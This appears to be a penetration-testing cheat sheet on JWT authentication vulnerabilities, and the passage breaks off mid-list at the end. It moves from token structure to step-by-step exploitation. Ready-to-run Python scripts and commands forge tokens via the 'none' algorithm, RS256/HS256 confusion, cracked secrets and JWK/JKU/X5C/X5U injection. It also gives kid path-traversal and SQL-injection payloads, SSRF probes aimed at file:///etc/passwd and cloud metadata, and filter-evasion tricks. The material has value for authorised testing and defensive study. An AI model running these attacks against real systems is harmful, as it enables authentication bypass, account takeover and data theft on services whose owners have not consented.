## JWT Authentication Vulnerabilities

- **What JWTs are**
  - JSON Web Tokens: encoded, signed JSON objects for secure data transmission
  - Self-contained tokens that carry user data and claims
  - Stateless authentication mechanism widely used in modern web applications
  - Consist of three parts: header, payload, and signature
  - Used for authentication, authorization, and information exchange
  - Base64Url-encoded components separated by periods (xxx.yyy.zzz)
  - RFC 7519 compliant standardized format
  - Designed to be compact and URL-safe
  - Related standards include JWS (JSON Web Signature) and JWE (JSON Web Encryption)
  - Can utilize various signing algorithms (symmetric and asymmetric)

- **JWT structure and components**
  - **Header**: Contains metadata about the token
    - `alg`: Algorithm used for signing (HS256, RS256, none, etc.)
    - `typ`: Token type (usually "JWT")
    - Optional parameters: `kid` (Key ID), `jwk` (JSON Web Key), `jku` (JWK Set URL), `x5c` (X.509 Certificate Chain), `x5u` (X.509 URL), `cty` (Content Type)
    
  - **Payload**: Contains the actual data claims
    - Registered claims (standardized):
      - `iss` (Issuer): Entity that issued the token
      - `sub` (Subject): Subject of the token (usually user ID)
      - `exp` (Expiration Time): When the token expires
      - `nbf` (Not Before): When the token starts being valid
      - `iat` (Issued At): When the token was issued
      - `jti` (JWT ID): Unique identifier for the token
      - `aud` (Audience): Intended recipient of the token
    - Public claims: Custom claims registered in the IANA JSON Web Token Registry
    - Private claims: Custom claims agreed upon by the parties using the token
    
  - **Signature**: Cryptographically secures the token
    - Created by signing the encoded header and payload
    - Uses the algorithm specified in the header
    - Verifies token integrity and authenticity
    - Prevents tampering with the token content

- **How vulnerabilities arise**
  - Improper signature validation
  - Using weak or predictable secret keys
  - Trusting user-controlled header parameters
  - Improper handling of the algorithm field
  - Lack of expiration validation
  - Insecure storage of keys
  - SQL injection via header parameters
  - Path traversal via header parameters
  - Algorithm confusion between symmetric and asymmetric
  - Race conditions in token validation
  - Insecure deserialization of token data
  - Replay attacks due to missing or improper validation
  - Incorrect implementation of JWT libraries
  - Key leakage through error messages or debugging information
  - Insufficient validation of custom claims
  - Misunderstanding the security guarantees provided by JWTs

- **Impact**
  - Complete authentication bypass
  - Privilege escalation 
  - Account takeover
  - Horizontal privilege movement (accessing other users' data)
  - Vertical privilege escalation (gaining admin rights)
  - Information disclosure
  - Data manipulation
  - Server-side request forgery (SSRF)
  - Remote code execution (when combined with other vulnerabilities)
  - Persistent access to compromised accounts
  - Session hijacking
  - Impersonation of any user
  - Access to sensitive APIs
  - Circumvention of multi-factor authentication
  - Bypassing rate limits or security controls

- **Identifying JWT usage**
  - Look for base64-encoded strings with three segments separated by periods
  - Check for `Authorization: Bearer` headers in requests
  - Analyze JavaScript files for JWT handling code
  - Check for JWT-related cookies
  - Identify endpoints with JWT-related parameters
  - Look for JWT libraries in client-side code
  - Examine user sessions after authentication
  - Check for token expiration or refresh mechanisms
  - Look for JWT-related error messages
  - Analyze authentication and authorization endpoints

- **Using Burp Suite for JWT testing**
  - JWT Editor extension features:
    1. Decoder tab for base64 conversion
    2. JWT Editor Keys tab for key management
    3. "JSON Web Token" tab in request/response viewers
    4. Embedded attack functionality
  - Capturing and analyzing JWT tokens:
    1. Intercept token-based requests
    2. Examine token structure in the JSON Web Token tab
    3. Decode header and payload
    4. Modify claims and parameters
  - Key management in Burp JWT Editor:
    1. Generate new RSA/HMAC/ECC keys
    2. Import existing keys from various formats
    3. Export keys for external use
    4. Use keys for signing modified tokens
  - Attack automation:
    1. Using "None" algorithm attack
    2. Exploiting algorithm confusion
    3. Testing for key disclosure
    4. Embedded JWK attacks
  - Using Burp Sequencer to analyze token randomness
  - Using Burp Intruder for brute-forcing attacks
  - Extracting and analyzing JWT macros

- **Step-by-step exploitation techniques**

  - **Altering JWT payload claims**
    1. **Basic claim tampering**:
       - Step 1: Capture a valid JWT token in Burp Suite
       - Step 2: Decode the payload to identify interesting claims (role, permissions, user ID)
       - Step 3: Modify the claims to escalate privileges (e.g., change `"role":"user"` to `"role":"admin"`)
       - Step 4: Keep the original signature (testing if signature verification is implemented)
       - Step 5: Forward the modified request and observe the response
       - Example: Change `"sub":"john"` to `"sub":"admin"` in payload while keeping original signature
       - Testing insight: If this works, the application is not verifying signatures at all

    2. **JWT signature validation bypass**:
       - Step 1: Decode a valid JWT token
       - Step 2: Modify payload claims to gain higher privileges
       - Step 3: Leave signature as is (don't recalculate)
       - Step 4: Forward the request with the modified token
       - Step 5: Check if application accepts the token despite invalid signature
       - Example: Change `"admin":false` to `"admin":true` without updating signature
       - Exploitation insight: Applications that don't verify signatures essentially render JWT security useless

  - **Algorithm manipulation attacks**
    1. **Using 'none' algorithm bypass**:
       - Step 1: Capture a valid JWT
       - Step 2: Decode and modify the header to set `"alg":"none"`
       - Step 3: Modify payload claims as needed
       - Step 4: Remove the signature part (leave only the trailing period)
       - Step 5: Forward the request with the modified token
       - Example: Change `{"alg":"HS256","typ":"JWT"}` to `{"alg":"none","typ":"JWT"}`
       - Variations to try: `"alg":"None"`, `"alg":"NONE"`, `"alg":"nOnE"`, `"alg":"none "`
       - Python script:
       ```python
       import base64
       import json
       
       # Original JWT
       original_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.Kh1ZJfXLnLFTLvmgOjuaEDJ4ydCz3Po2Iim-otN-Nbg"
       
       # Split the token
       header_b64, payload_b64, signature = original_jwt.split('.')
       
       # Decode header and modify algorithm
       header = json.loads(base64.urlsafe_b64decode(header_b64 + "=" * (4 - len(header_b64) % 4)).decode())
       header["alg"] = "none"
       
       # Decode payload and modify claims
       payload = json.loads(base64.urlsafe_b64decode(payload_b64 + "=" * (4 - len(payload_b64) % 4)).decode())
       payload["role"] = "admin"
       
       # Encode header and payload
       new_header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
       new_payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
       
       # Create new token with empty signature
       new_jwt = f"{new_header_b64}.{new_payload_b64}."
       
       print(new_jwt)
       ```

    2. **Algorithm confusion attack (RS256 to HS256)**:
       - Step 1: Identify a JWT signed with RS256 (asymmetric RSA)
       - Step 2: Obtain the server's public key (from certificate, JWK endpoint, etc.)
       - Step 3: Change the algorithm in the header from RS256 to HS256
       - Step 4: Modify payload claims as desired
       - Step 5: Sign the token using the public key as the HMAC secret
       - Step 6: Send the modified token to the server
       - Example: Change `{"alg":"RS256","typ":"JWT"}` to `{"alg":"HS256","typ":"JWT"}`
       - Exploitation insight: Server may verify HS256 signature using the public key as the secret
       - Python script with pyjwt:
       ```python
       import jwt
       
       # Original JWT signed with RS256
       original_jwt = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOmZhbHNlLCJpYXQiOjE1MTYyMzkwMjJ9.signature"
       
       # Public key obtained from server (PEM format)
       public_key = """-----BEGIN PUBLIC KEY-----
       MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAu1SU1LfVLPHCozMxH2Mo
       4lgOEePzNm0tRgeLezV6ffAt0gunVTLw7onLRnrq0/IzW7yWR7QkrmBL7jTKEn5u
       +qKhbwKfBstIs+bMY2Zkp18gnTxKLxoS2tFczGkPLPgizskuemMghRniWaoLcyeh
       kd3qqGElvW/VDL5AaWTg0nLVkjRo9z+40RQzuVaE8AkAFmxZzow3x+VJYKdjykkJ
       0iT9wCS0DRTXu269V264Vf/3jvredZiKRkgwlL9xNAwxXFg0x/XFw005UWVRIkdg
       cKWTjpBP2dPwVZ4WWC+9aGVd+Gyn1o0CLelf4rEjGoXbAAEgAqeGUxrcIlbjXfbc
       mwIDAQAB
       -----END PUBLIC KEY-----"""
       
       # Decode the JWT to access the payload
       payload = jwt.decode(original_jwt, options={"verify_signature": False})
       
       # Modify payload claims as needed
       payload["admin"] = True
       
       # Create new JWT with HS256 algorithm, signed using the public key as the secret
       new_jwt = jwt.encode(payload, public_key, algorithm="HS256")
       
       print(new_jwt)
       ```

  - **Secret key attacks**
    1. **Brute-forcing weak keys with hashcat**:
       - Step 1: Capture a valid JWT token
       - Step 2: Create or obtain a wordlist of common secrets
       - Step 3: Run hashcat with the appropriate mode
       - Step 4: Once the key is found, use it to sign your forged tokens
       - Step 5: Create a new token with modified claims and sign it with the discovered key
       - Command: `hashcat -a 0 -m 16500 "JWT_TOKEN" wordlist.txt`
       - Example with a common JWT secret wordlist:
       ```bash
       # Capture the JWT token
       JWT="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.Kh1ZJfXLnLFTLvmgOjuaEDJ4ydCz3Po2Iim-otN-Nbg"
       
       # Run hashcat against common secrets
       hashcat -a 0 -m 16500 "$JWT" /path/to/jwt-secrets.txt
       
       # After finding the secret (example: "secret123"), use it to create a new token
       ```
       - Python script to sign with discovered key:
       ```python
       import jwt
       
       # Secret discovered through brute force
       secret = "secret123"
       
       # Create payload with elevated privileges
       payload = {
           "sub": "1234567890",
           "role": "admin",
           "iat": 1516239022
       }
       
       # Create new signed token
       new_jwt = jwt.encode(payload, secret, algorithm="HS256")
       
       print(new_jwt)
       ```

    2. **Extracting secrets from source code/errors**:
       - Step 1: Check for JWT-related source code in JavaScript files
       - Step 2: Look for hardcoded secrets in repository commit history
       - Step 3: Generate errors by sending malformed JWTs
       - Step 4: Analyze error responses for key disclosure
       - Step 5: Check for config files accidentally exposed in web roots
       - Example: Trigger verbose errors with a malformed token structure
       - Exploitation insight: Debug environments often reveal more information in errors
       - Script to generate malformed tokens for error testing:
       ```python
       import requests
       
       base_url = "https://target.com/api"
       headers = {"Authorization": "Bearer "}
       
       # Test various malformed tokens
       test_tokens = [
           "eyJhbGc.eyJzdWI.signature",  # Malformed base64
           "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",  # Missing parts
           "invalid.invalid.invalid",  # Invalid parts
           "eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.signature"  # Unsupported algorithm
       ]
       
       for token in test_tokens:
           current = headers.copy()
           current["Authorization"] += token
           response = requests.get(f"{base_url}/profile", headers=current)
           print(f"Token: {token}\nStatus: {response.status_code}\nResponse: {response.text}\n{'='*50}")
       ```

  - **JWK and JKU parameter attacks**
    1. **JWK header injection attack**:
       - Step 1: Generate a new RSA key pair using OpenSSL or JWT Editor in Burp
       - Step 2: Capture a valid JWT
       - Step 3: Modify the header to include a `jwk` parameter containing your public key
       - Step 4: Modify payload claims as desired
       - Step 5: Sign the token with your private key
       - Step 6: Send the modified token to the server
       - Command to generate key pair: `openssl genrsa -out private.pem 2048`
       - Command to extract public key: `openssl rsa -in private.pem -pubout -out public.pem`
       - Python script using pyjwt:
       ```python
       import jwt
       from cryptography.hazmat.primitives import serialization
       from cryptography.hazmat.primitives.asymmetric import rsa
       import json
       import base64
       
       # Generate a key pair
       private_key = rsa.generate_private_key(
           public_exponent=65537,
           key_size=2048
       )
       
       public_key = private_key.public_key()
       
       # Convert public key to PEM format
       pem_public = public_key.public_bytes(
           encoding=serialization.Encoding.PEM,
           format=serialization.PublicFormat.SubjectPublicKeyInfo
       )
       
       # Convert private key to PEM format
       pem_private = private_key.private_bytes(
           encoding=serialization.Encoding.PEM,
           format=serialization.PrivateFormat.PKCS8,
           encryption_algorithm=serialization.NoEncryption()
       )
       
       # Extract required components for JWK
       numbers = public_key.public_numbers()
       e_bytes = numbers.e.to_bytes((numbers.e.bit_length() + 7) // 8, byteorder='big')
       n_bytes = numbers.n.to_bytes((numbers.n.bit_length() + 7) // 8, byteorder='big')
       
       e_b64 = base64.urlsafe_b64encode(e_bytes).decode('utf-8').rstrip('=')
       n_b64 = base64.urlsafe_b64encode(n_bytes).decode('utf-8').rstrip('=')
       
       # Create payload with desired claims
       payload = {
           "sub": "1234567890",
           "name": "John Doe",
           "admin": True,
           "iat": 1516239022
       }
       
       # Create header with JWK parameter
       header = {
           "alg": "RS256",
           "typ": "JWT",
           "jwk": {
               "kty": "RSA",
               "e": e_b64,
               "n": n_b64,
               "kid": "attacker-key"
           }
       }
       
       # Create the JWT manually to include the custom header
       header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
       payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
       
       message = f"{header_b64}.{payload_b64}"
       
       # Sign the token with the private key
       signature = jwt.api_jws._jws_signature(message.encode(), pem_private, "RS256")
       signature_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
       
       # Final token
       token = f"{message}.{signature_b64}"
       
       print(token)
       ```

    2. **JKU header injection attack**:
       - Step 1: Generate an RSA key pair
       - Step 2: Host a JWK Set (JWKS) containing your public key on an attacker-controlled server
       - Step 3: Capture a valid JWT
       - Step 4: Modify the header to include a `jku` parameter pointing to your JWKS URL
       - Step 5: Modify payload claims as desired
       - Step 6: Sign the token with your private key
       - Step 7: Send the modified token to the server
       - Example JWKS file format:
       ```json
       {
         "keys": [
           {
             "kty": "RSA",
             "kid": "attacker-key",
             "use": "sig",
             "alg": "RS256",
             "n": "sLhA8lw...",
             "e": "AQAB"
           }
         ]
       }
       ```
       - Testing insight: Try variations like `jku` value with different subdomains of legitimate domains
       - Exploitation insight: Check for path traversal in `jku` URL filtering
       - Example Python script to serve JWKS:
       ```python
       from http.server import HTTPServer, BaseHTTPRequestHandler
       import json
       import ssl
       
       # Your JWKS data
       jwks_data = {
         "keys": [
           {
             "kty": "RSA",
             "kid": "attacker-key",
             "use": "sig",
             "alg": "RS256",
             "n": "sLhA8lw...",
             "e": "AQAB"
           }
         ]
       }
       
       class JWKSHandler(BaseHTTPRequestHandler):
           def do_GET(self):
               self.send_response(200)
               self.send_header('Content-Type', 'application/json')
               self.end_headers()
               self.wfile.write(json.dumps(jwks_data).encode())
       
       httpd = HTTPServer(('0.0.0.0', 8080), JWKSHandler)
       print("JWKS server running at http://0.0.0.0:8080/")
       httpd.serve_forever()
       ```

  - **Kid (Key ID) parameter attacks**
    1. **KID header path traversal attack**:
       - Step 1: Capture a valid JWT token
       - Step 2: Identify the key ID (`kid`) parameter in the header
       - Step 3: Modify the `kid` parameter to point to a predictable file on the server
       - Step 4: Modify the payload claims as desired
       - Step 5: Sign the token with the content of the targeted file as the key
       - Step 6: Send the modified token to the server
       - Example values to try: `kid: "../../../etc/passwd"`, `kid: "/dev/null"`
       - Note: For `/dev/null`, sign with an empty string as the secret
       - Python script for path traversal in `kid`:
       ```python
       import jwt
       import base64
       import json
       
       # Original JWT
       original_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImtleTEifQ.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.signature"
       
       # Decode header and payload
       header_b64, payload_b64, signature = original_jwt.split('.')
       header = json.loads(base64.urlsafe_b64decode(header_b64 + "=" * (4 - len(header_b64) % 4)).decode())
       payload = json.loads(base64.urlsafe_b64decode(payload_b64 + "=" * (4 - len(payload_b64) % 4)).decode())
       
       # Modify header to include path traversal in kid
       header["kid"] = "../../../dev/null"
       
       # Modify payload claims
       payload["role"] = "admin"
       
       # Sign with empty string for /dev/null
       secret = ""  # Content of /dev/null is empty
       
       # Create new JWT
       new_jwt = jwt.encode(payload, secret, algorithm="HS256", headers=header)
       
       print(new_jwt)
       ```

    2. **KID header SQL injection attack**:
       - Step 1: Identify JWT using a `kid` parameter
       - Step 2: Analyze how the application retrieves keys based on this parameter
       - Step 3: Craft SQL injection payloads for the `kid` parameter
       - Step 4: Create a JWT with the injected `kid` and appropriate claims
       - Step 5: Sign the token with a known value based on your injection
       - Step 6: Send the modified token to the server
       - Example injection: `kid: "98765' UNION SELECT 'attackerkey' --"`
       - For this example, sign with "attackerkey" as the secret
       - More examples:
         - `kid: "non-existent-id' UNION SELECT 'mykey';--"`
         - `kid: "0' UNION SELECT '12345';--"`
       - Testing insight: Try boolean-based injections to determine if SQL injection is possible
       - Python script for SQL injection in `kid`:
       ```python
       import jwt
       
       # Create header with SQL injection in kid
       header = {
           "alg": "HS256",
           "typ": "JWT",
           "kid": "98765' UNION SELECT 'attackerkey' --"
       }
       
       # Create payload with admin privileges
       payload = {
           "sub": "1234567890",
           "role": "admin",
           "iat": 1516239022
       }
       
       # Sign with the value that will be selected by the SQL injection
       secret = "attackerkey"
       
       # Create new JWT
       token = jwt.encode(payload, secret, algorithm="HS256", headers=header)
       
       print(token)
       ```

  - **X5C and X5U parameter attacks**
    1. **X5C certificate chain attack**:
       - Step 1: Generate a self-signed certificate with OpenSSL
       - Step 2: Extract the public key in the correct format
       - Step 3: Capture a valid JWT
       - Step 4: Modify the header to include an `x5c` parameter with your certificate
       - Step 5: Modify payload claims as desired
       - Step 6: Sign the token with your private key
       - Step 7: Send the modified token to the server
       - Commands to generate certificate:
       ```bash
       # Generate private key
       openssl genpkey -algorithm RSA -out private_key.pem -pkeyopt rsa_keygen_bits:2048
       
       # Generate self-signed certificate
       openssl req -new -x509 -key private_key.pem -out certificate.pem -days 365 -subj "/CN=attacker.com"
       
       # View certificate in base64 format
       openssl x509 -in certificate.pem -text -noout
       ```
       - Python script for `x5c` injection:
       ```python
       import jwt
       import base64
       from cryptography import x509
       from cryptography.hazmat.backends import default_backend
       from cryptography.hazmat.primitives import serialization
       import json
       
       # Read your certificate and private key
       with open('certificate.pem', 'rb') as f:
           cert_data = f.read()
           
       with open('private_key.pem', 'rb') as f:
           private_key_data = f.read()
       
       # Parse certificate
       cert = x509.load_pem_x509_certificate(cert_data, default_backend())
       
       # Get certificate in DER format and encode to base64
       cert_der = cert.public_bytes(serialization.Encoding.DER)
       cert_b64 = base64.b64encode(cert_der).decode('utf-8')
       
       # Load private key
       private_key = serialization.load_pem_private_key(
           private_key_data, 
           password=None, 
           backend=default_backend()
       )
       
       # Create header with x5c parameter
       header = {
           "alg": "RS256",
           "typ": "JWT",
           "x5c": [cert_b64]
       }
       
       # Create payload with admin privileges
       payload = {
           "sub": "1234567890",
           "name": "John Doe",
           "admin": True,
           "iat": 1516239022
       }
       
       # Create JWT with PEM format private key
       private_pem = private_key.private_bytes(
           encoding=serialization.Encoding.PEM,
           format=serialization.PrivateFormat.PKCS8,
           encryption_algorithm=serialization.NoEncryption()
       )
       
       token = jwt.encode(payload, private_pem, algorithm="RS256", headers=header)
       
       print(token)
       ```

    2. **X5U URL manipulation attack**:
       - Step 1: Generate a self-signed certificate
       - Step 2: Host the certificate on an attacker-controlled server
       - Step 3: Modify a JWT header to include an `x5u` parameter pointing to your certificate
       - Step 4: Modify payload claims as desired
       - Step 5: Sign the token with your private key
       - Step 6: Send the modified token to the server
       - Testing insight: Try SSRF techniques to bypass URL restrictions
       - Exploitation insight: This can also be used for SSRF if the server fetches the URL
       - Example header: `{"alg":"RS256","typ":"JWT","x5u":"https://attacker.com/cert.pem"}`
       - Python server to host certificate:
       ```python
       from http.server import HTTPServer, BaseHTTPRequestHandler
       
       class CertHandler(BaseHTTPRequestHandler):
           def do_GET(self):
               self.send_response(200)
               self.send_header('Content-Type', 'application/x-pem-file')
               self.end_headers()
               with open('certificate.pem', 'rb') as f:
                   self.wfile.write(f.read())
       
       httpd = HTTPServer(('0.0.0.0', 8080), CertHandler)
       print("Certificate server running at http://0.0.0.0:8080/")
       httpd.serve_forever()
       ```

  - **Exploiting JWT claim vulnerabilities**
    1. **Expired token manipulation**:
       - Step 1: Capture a valid JWT
       - Step 2: Decode the payload to check for `exp` (expiration) claim
       - Step 3: Modify the expiration timestamp to extend token validity
       - Step 4: If the signature is validated, you'll need the secret key to sign it
       - Step 5: Send the modified token to the server
       - Example: Change `"exp":1516239022` to a future timestamp
       - Testing insight: Try removing the `exp` claim entirely
       - Exploitation insight: Some applications don't validate expiration on the server side
       - Python script for manipulating expiration:
       ```python
       import jwt
       import time
       
       # Original JWT with expired timestamp
       token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJleHAiOjE1MTYyMzkwMjJ9.signature"
       
       # Decode the token without verification
       payload = jwt.decode(token, options={"verify_signature": False})
       
       # Update expiration to one year in the future
       payload['exp'] = int(time.time()) + 31536000
       
       # If you have the secret key (obtained through previous attacks), sign it
       # For this example, assuming secret key is "your_secret_key"
       secret = "your_secret_key"
       
       # Create new token with updated expiration
       new_token = jwt.encode(payload, secret, algorithm="HS256")
       
       print(new_token)
       ```

    2. **Token replay attack**:
       - Step 1: Capture a valid JWT from your session
       - Step 2: Send requests with this token after your session should be invalid
       - Step 3: Check if the server still accepts the token
       - Step 4: If `jti` (JWT ID) claim is used, try capturing multiple tokens to identify patterns
       - Step 5: If patterns are found, predict and generate valid `jti` values
       - Testing insight: Try using tokens after logout or password change
       - Exploitation insight: Some implementations don't invalidate tokens properly after logout
       - Script to test token validity after various session events:
       ```python
       import requests
       import time
       
       base_url = "https://example.com/api"
       token = "captured_valid_jwt"
       headers = {"Authorization": f"Bearer {token}"}
       
       def test_token():
           response = requests.get(f"{base_url}/profile", headers=headers)
           return response.status_code == 200
       
       # Initial test
       print(f"Initial token validity: {test_token()}")
       
       # Perform logout
       logout_headers = headers.copy()
       requests.post(f"{base_url}/logout", headers=logout_headers)
       print(f"Token validity after logout: {test_token()}")
       
       # Wait and test again
       time.sleep(60)
       print(f"Token validity after 60 seconds: {test_token()}")
       ```

    3. **Missing claims exploitation**:
       - Step 1: Analyze JWT payload for missing standard claims
       - Step 2: Modify the payload to remove or manipulate claims like `aud`, `iss`, `nbf`
       - Step 3: If signature can be forged, create a new valid token without these claims
       - Step 4: Test if the server accepts tokens without critical claims
       - Example: Remove `aud` claim to bypass audience validation
       - Testing insight: Try negative values for time-based claims
       - Exploitation insight: Missing claim validation can lead to token reuse across services
       - Python script for removing claims:
       ```python
       import jwt
       
       # Original JWT
       token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpc3MiOiJhdXRoLnNlcnZpY2UuY29tIiwiYXVkIjoiYXBpLnNlcnZpY2UuY29tIiwiZXhwIjoxNjczNDU2Nzg5fQ.signature"
       
       # Decode the token without verification
       payload = jwt.decode(token, options={"verify_signature": False})
       
       # Remove critical claims
       if 'aud' in payload: del payload['aud']
       if 'iss' in payload: del payload['iss']
       if 'exp' in payload: del payload['exp']
       
       # If you have the secret key, sign the new payload
       secret = "discovered_secret"
       
       # Create new token with removed claims
       new_token = jwt.encode(payload, secret, algorithm="HS256")
       
       print(new_token)
       ```

- **Advanced attack techniques**

  - **Chained vulnerabilities**
    1. **Combining algorithm confusion and JKU attacks**:
       - Step 1: Identify JWT using RS256 algorithm
       - Step 2: Host a malicious JWK Set on attacker-controlled server
       - Step 3: Modify token's `alg` to HS256 and add `jku` pointing to attacker's JWKS
       - Step 4: Sign the token using the public key as the HMAC secret
       - Step 5: Send the modified token to the server
       - Testing insight: Chain multiple header manipulations to bypass protections
       - Exploitation insight: Multiple vulnerabilities often work together to bypass protections

    2. **SSRF through JWT header parameters**:
       - Step 1: Identify JWT using `jku` or `x5u` parameters
       - Step 2: Replace these URLs with internal network addresses or sensitive endpoints
       - Step 3: Modify payload claims as desired
       - Step 4: Sign the token with appropriate key
       - Step 5: Send the modified token and observe responses
       - Step 6: Analyze any error messages for information leakage
       - Example values: `"jku": "http://localhost:8080/admin"`, `"x5u": "file:///etc/passwd"`
       - Testing insight: Try various SSRF payloads and internal addresses
       - Script to systematically test SSRF via JWT:
       ```python
       import jwt
       import requests
       import time
       
       base_url = "https://vulnerable-app.com/api"
       
       # If you have obtained the secret
       secret = "discovered_secret"
       
       # SSRF targets to test
       ssrf_targets = [
           "http://localhost/",
           "http://localhost:8080/",
           "http://127.0.0.1/admin",
           "file:///etc/passwd",
           "http://169.254.169.254/latest/meta-data/",  # AWS metadata
           "http://10.0.0.1/"
       ]
       
       # Create payload
       payload = {
           "sub": "1234567890",
           "role": "user",
           "iat": int(time.time())
       }
       
       for target in ssrf_targets:
           # Try with JKU
           headers_jku = {
               "alg": "HS256",
               "typ": "JWT",
               "jku": target
           }
           
           # Try with X5U
           headers_x5u = {
               "alg": "HS256",
               "typ": "JWT",
               "x5u": target
           }
           
           token_jku = jwt.encode(payload, secret, algorithm="HS256", headers=headers_jku)
           token_x5u = jwt.encode(payload, secret, algorithm="HS256", headers=headers_x5u)
           
           # Test JKU token
           response_jku = requests.get(
               f"{base_url}/profile", 
               headers={"Authorization": f"Bearer {token_jku}"}
           )
           
           # Test X5U token
           response_x5u = requests.get(
               f"{base_url}/profile", 
               headers={"Authorization": f"Bearer {token_x5u}"}
           )
           
           print(f"Target: {target}")
           print(f"JKU Status: {response_jku.status_code}, Length: {len(response_jku.text)}")
           print(f"X5U Status: {response_x5u.status_code}, Length: {len(response_x5u.text)}")
           print("-" * 50)
       ```

    3. **JWT Token Forgery via Cross-Service Key Reuse**:
       - Step 1: Identify multiple services using JWT authentication
       - Step 2: Obtain legitimate tokens from each service
       - Step 3: Check if the signatures are identical for the same payload across services
       - Step 4: If key reuse is detected, obtain a token from one service
       - Step 5: Modify the payload to impersonate users or escalate privileges
       - Step 6: Use the same signature mechanism to sign the token
       - Step 7: Use the forged token on the target service
       - Testing insight: Compare tokens from development, staging, and production environments
       - Exploitation insight: Dev keys often get reused in production environments
       - Script to check for key reuse:
       ```python
       import jwt
       import requests
       import json
       import base64
       
       # List of services to check
       services = [
           {"name": "Service A", "url": "https://service-a.example.com/api/login", "creds": {"username": "test", "password": "test123"}},
           {"name": "Service B", "url": "https://service-b.example.com/api/login", "creds": {"username": "test", "password": "test123"}},
           {"name": "Service C", "url": "https://service-c.example.com/api/login", "creds": {"username": "test", "password": "test123"}}
       ]
       
       # Get tokens from each service
       tokens = {}
       for service in services:
           response = requests.post(service["url"], json=service["creds"])
           if response.status_code == 200:
               token = response.json().get("token")
               if token:
                   tokens[service["name"]] = token
                   print(f"Got token from {service['name']}")
       
       # Check for signature reuse
       signatures = {}
       for service_name, token in tokens.items():
           parts = token.split('.')
           if len(parts) == 3:
               signatures[service_name] = parts[2]
       
       # Compare signatures
       for name1, sig1 in signatures.items():
           for name2, sig2 in signatures.items():
               if name1 != name2 and sig1 == sig2:
                   print(f"ALERT: Signature reuse detected between {name1} and {name2}")
                   print(f"This indicates the same key is being used to sign tokens for both services")
       ```

  - **Automated JWT attacks**
    1. **Using JWT_Tool for automated testing**:
       - Step 1: Install JWT_Tool: `git clone https://github.com/ticarpi/jwt_tool`
       - Step 2: Capture a valid JWT token
       - Step 3: Run JWT_Tool's mode all tests: `python3 jwt_tool.py -M at -t "https://api.example.com" -rh "Authorization: Bearer <token>"`
       - Step 4: Review findings for vulnerabilities
       - Step 5: Exploit discovered vulnerabilities with specialized modes
       - Common JWT_Tool commands:
         - Decode token: `python3 jwt_tool.py <token>`
         - Check signature: `python3 jwt_tool.py -V -S <token>`
         - Test "none" vulnerability: `python3 jwt_tool.py -X a <token>`
         - Test for algorithm confusion: `python3 jwt_tool.py -X k -pk public.pem <token>`
         - Crack secret: `python3 jwt_tool.py -C -d wordlist.txt <token>`
       - Additional useful parameters:
         - `-T`: Tamper with the token (modify claims)
         - `-I`: Inject a new claim
         - `-S`: Sign with a key
         - `-R`: Check for token expiry
       - Example workflow:
       ```bash
       # Decode and analyze the token
       python3 jwt_tool.py eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyMTIzIn0.signature
       
       # Run all tests against live endpoint
       python3 jwt_tool.py -M at -t "https://api.example.com/profile" -rh "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyMTIzIn0.signature"
       
       # If "none" algorithm vulnerability is found, exploit it
       python3 jwt_tool.py -X a -T eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyMTIzIn0.signature
       
       # If weak key is found, sign a tampered token
       python3 jwt_tool.py -S hs256 -p "discovered_secret" -T -pc role -pv admin eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyMTIzIn0.signature
       ```

    2. **Using Burp Suite JWT Editor extension for attack automation**:
       - Step 1: Install the JWT Editor extension in Burp Suite
       - Step 2: Capture a request containing a JWT token
       - Step 3: Send to Repeater and switch to the "JSON Web Token" tab
       - Step 4: Use the built-in attacks:
         - Change signature algorithm to "None"
         - Embedded JWK attack
         - Key confusion attack
       - Step 5: Modify payload claims using the interface
       - Step 6: Send the modified request
       - Testing insight: Use Burp Intruder with JWT Editor's capabilities for automated testing
       - Example workflow:
         1. Capture token-bearing request in Proxy
         2. Send to Repeater
         3. Modify claims in JSON Web Token tab
         4. Select attack from the dropdown
         5. Use attack-specific options
         6. Send modified request
         7. Analyze the response

- **Evasion techniques for JWT attacks**
  1. **Signature verification bypass obfuscation**:
     - Try using different letter cases: `alg: "none"`, `alg: "None"`, `alg: "NONE"`
     - Add whitespace: `alg: "none "`, `alg: " none"`
     - Use alternative encodings: URL-encode parts of the token
     - Use non-standard encodings for "none": `alg: "nOnE"`
     - Add non-standard attributes in the header to confuse parsers
     - Pad base64 sections with extra characters
     - Test variations on algorithm names: "hs256" instead of "HS256"

  2. **Evading key ID (kid) parameter restrictions**:
     - Use alternative path traversal sequences: `....//....//....//etc/passwd`
